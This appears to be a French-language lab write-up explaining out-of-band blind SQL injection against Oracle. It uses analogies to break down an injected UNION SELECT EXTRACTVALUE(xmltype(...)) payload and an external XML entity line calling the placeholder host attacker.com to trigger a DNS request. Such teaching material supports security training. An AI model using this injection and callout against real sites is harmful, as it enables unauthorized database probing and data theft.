
# 1️⃣ Le problème de départ

Dans une **blind SQL injection**, tu es dans cette situation :

toi → site web → base de données

Mais :

- le site **ne montre pas les erreurs**
    
- le site **ne montre pas les données**
    

Donc même si l’injection marche, **tu ne vois rien**.

---

# 2️⃣ L’idée d’OAST

La solution est de faire faire **une action réseau à la base de données**.

Donc on transforme le problème en :

toi → site web → base de données → internet → toi

La base va **t’envoyer un signal**.

---

# 3️⃣ Analogie simple

Imagine :

- tu parles à quelqu’un **dans une pièce fermée**
    
- il ne peut pas te répondre
    

Donc tu lui dis :

> "Si tu entends mon message, **allume la lumière dehors**."

Si tu vois la lumière :

➡️ tu sais que ton message est passé.

---

# 4️⃣ Dans le lab

La base de données est **Oracle Database**.

La requête injectée est :

x'+UNION+SELECT+EXTRACTVALUE(xmltype('XML'),'/l')+FROM+dual--

On va la découper.

---

# 5️⃣ `x'`

Cela **ferme la requête SQL originale**.

Le site faisait probablement :

SELECT * FROM tracking WHERE id = 'TrackingId'

Avec l’injection :

SELECT * FROM tracking WHERE id = 'x'

Puis ton SQL continue.

---

# 6️⃣ `UNION SELECT`

Cela permet d’ajouter **ta propre requête SQL**.

Analogie :

Imagine une liste :

liste produits

Avec `UNION` tu ajoutes :

liste produits  
+  
ta liste à toi

---

# 7️⃣ `xmltype(...)`

Cela dit à la base :

voici un document XML  
lis-le

---

# 8️⃣ Le XML malveillant

Le XML contient :

<!ENTITY % remote SYSTEM "http://attacker.com">

Cela signifie :

> "Va chercher quelque chose sur ce site."

Donc la base fait :

Oracle → http://attacker.com

---

# 9️⃣ `%remote;`

Cela dit :

exécute l’entité externe

Donc la base contacte ton serveur.

---

# 🔟 Résultat

La base fait :

Oracle DB → DNS request → ton domaine

Et tu vois la requête.

Donc tu sais :

l'injection SQL fonctionne

---

# 11️⃣ Analogie finale

Imagine :

toi → concierge → directeur

Tu ne peux pas parler au directeur.

Donc tu dis au concierge :

> "Si le directeur reçoit mon message, dis-lui de **m’envoyer une carte postale**."

Si tu reçois la carte :

➡️ tu sais que ton message est arrivé.

La **carte postale = requête DNS**.

---

# 12️⃣ Pourquoi c’est puissant

Même si :

pas d'erreur SQL  
pas de données visibles

tu peux quand même voir :

interaction réseau externe

C’est ce qu’on appelle :

OAST  
Out Of Band Application Security Testing